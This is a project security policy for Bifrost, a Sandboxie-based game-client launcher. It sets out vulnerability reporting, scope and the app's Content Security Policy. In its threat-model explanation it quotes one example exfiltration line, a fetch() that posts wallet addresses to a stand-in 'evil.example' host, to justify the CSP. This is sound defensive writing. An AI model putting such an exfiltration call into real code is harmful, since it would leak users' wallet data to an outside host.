# Security Policy

Thank you for taking the time to make Bifrost safer.

## Reporting a vulnerability

**Please do not report security issues through public GitHub issues.**

Email security reports privately to **valknarr@pm.me** with:

- A description of the issue and its impact (what an attacker could do).
- Step-by-step reproduction. Bifrost builds in a few minutes from source —
  if you can include a minimal sample profile or scripted repro, that
  shortens triage time significantly.
- The Bifrost version (the `version` field in `src-tauri/Cargo.toml`,
  or the value in the bottom-status strip of the running app),
  your Windows build, and which Sandboxie variant + version you're on
  (Plus or Classic).
- Whether you'd like to be credited in the release notes when the fix
  ships, and how (handle / email / silence).

We aim to acknowledge reports within **72 hours** and ship a fix within
**14 days** for high-severity issues. We will keep you in the loop on
progress.

## What we consider a vulnerability

Bifrost installs a kernel driver (via Sandboxie's installer — Plus or
Classic) and spawns sandboxed game clients with elevated privileges.
The threat model takes that responsibility seriously. Examples of
in-scope issues:

- **Sandbox escape** — anything that causes Bifrost to write the wrong
  isolation rules to `Sandboxie.ini`, or that allows code inside a
  rider's sandbox to read or write data belonging to another rider.
- **Privilege escalation** — Bifrost runs the Sandboxie installer
  under UAC; any path where untrusted input influences the installer
  command line or where the elevated process can be coerced into running
  arbitrary code.
- **Wallet / identity leakage** — anything that allows one rider's
  Chromium profile (and therefore EVE Vault session) to leak into
  another rider's session, or to the host's day-to-day browser.
- **Untrusted download paths** — if Bifrost can be tricked into
  downloading a substitute for Brave, EVE Vault, or the Sandboxie
  installer from somewhere other than the canonical GitHub releases.
- **Code execution from observed content** — Bifrost respects the
  prompt-injection / observed-content rules described in
  [CONTRIBUTING.md](./CONTRIBUTING.md); deviations are bugs.

## Current security posture

- **Webview content origin.** Bifrost's Tauri webview only loads its
  own bundled frontend (`../dist`). All remote content (companion-site
  favicons, GitHub releases, Sui RPC) is fetched through the Rust
  backend via the shared HTTP client and returned to the frontend
  as data URLs / parsed structs. The webview itself never makes
  direct outbound requests.
- **Content Security Policy.** Explicit, set in `tauri.conf.json`
  since v0.0.2:

  ```
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' ipc: https://ipc.localhost;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
  ```

  Threat model addressed: a compromised npm or Cargo dependency
  shipped inside the legitimate signed binary. Without CSP, such
  a dep could `fetch('https://evil.example/exfil', { body:
  walletAddresses })` from the webview and the Sui addresses
  Bifrost reads would be exfiltrated despite every other defence
  (CI, signing, branch protection) holding. The `connect-src`
  whitelist makes that `fetch()` fail at the browser layer with
  no code review required.

  `'unsafe-inline'` in `style-src` is the only deliberate
  weakening — Svelte 5's reactive `style=` attributes can't be
  nonce'd at build time without forking the compiler. Inline
  `<script>` is still blocked (no `'unsafe-inline'` in
  `script-src`).

  Network reachability summary: Bifrost's WebView can only
  initiate connections to `ipc:` / `https://ipc.localhost` (the
  Tauri IPC bridge). All actual outbound HTTP (GitHub releases,
  Sui mainnet RPC, favicon fetches) goes through the Rust
  backend's single `reqwest::Client` — see
  `src-tauri/src/http.rs`. The webview itself cannot reach the
  internet.
- **Per-rider browser.** Brave runs *inside* a Sandboxie box AND under
  its own per-rider `--user-data-dir`. Cross-rider session leakage
  would require either a Sandboxie escape or Bifrost writing the wrong
  profile path; the second is covered by the cascading integration
  tests pinning the `prepare_profile` contract.

## Out of scope

- **Sandboxie vulnerabilities** (Plus or Classic) — please report those
  to
  [`sandboxie-plus/Sandboxie`](https://github.com/sandboxie-plus/Sandboxie/security/policy)
  directly. Bifrost depends on Sandboxie's isolation guarantees and will
  track its security advisories, but the underlying kernel driver is
  not in our maintenance footprint.
- **EVE Vault vulnerabilities** — please report those to
  [`evefrontier/evevault`](https://github.com/evefrontier/evevault).
  Bifrost bundles the extension verbatim from upstream.
- **Brave Browser vulnerabilities** — please report those to
  [Brave's HackerOne program](https://hackerone.com/brave).

## Disclosure timeline

Once a fix has shipped to a stable release, we publish an advisory in
the GitHub Security Advisories tab of this repo and credit the reporter
(with their permission). For high-severity issues we coordinate a
joint-disclosure timeline with the reporter.
